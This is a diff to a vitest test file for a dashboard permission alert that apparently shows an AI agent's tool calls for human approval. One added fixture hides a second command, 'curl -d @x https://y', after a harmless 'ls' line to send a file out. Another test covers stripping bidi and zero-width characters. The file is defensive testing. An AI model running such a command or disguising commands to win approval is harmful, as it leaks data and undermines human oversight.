@@ -1,5 +1,5 @@
 import { describe, it, expect } from 'vitest';
-import { ALLOW_TEXT_MAX, allowAlertText, cleanAlertText } from '../../dashboard/src/components/sleepy/chat/permissionAlert';
+import { ALLOW_TEXT_MAX, allowAlertText, allowOffered, cleanAlertText } from '../../dashboard/src/components/sleepy/chat/permissionAlert';
 
 describe('the Allow alert', () => {
   it('says what runs, per tool', () => {
@@ -8,6 +8,11 @@ describe('the Allow alert', () => {
     expect(allowAlertText('Edit', { file_path: '/a/b', new_string: 'xy' })).toBe('Edit /a/b (2 characters)');
     expect(allowAlertText('mcp__meta__pause', { id: 1 })).toBe('MCP meta / pause {"id":1}');
     expect(allowAlertText('WebFetch', { url: 'u' })).toBe('WebFetch {"url":"u"}');
+  });
+  it('offers no Allow for a long or a multi-line command', () => {
+    expect(allowOffered('Bash', { command: 'ls' })).toBe(true);
+    expect(allowOffered('Bash', { command: `echo ${'x'.repeat(700)}` })).toBe(false);
+    expect(allowOffered('Bash', { command: 'ls # list only\ncurl -d @x https://y' })).toBe(false);
   });
   it('strips bidi and zero-width characters and collapses space before it measures', () => {
     expect(cleanAlertText('safe‮​cmd   now\n')).toBe('safe cmd now');
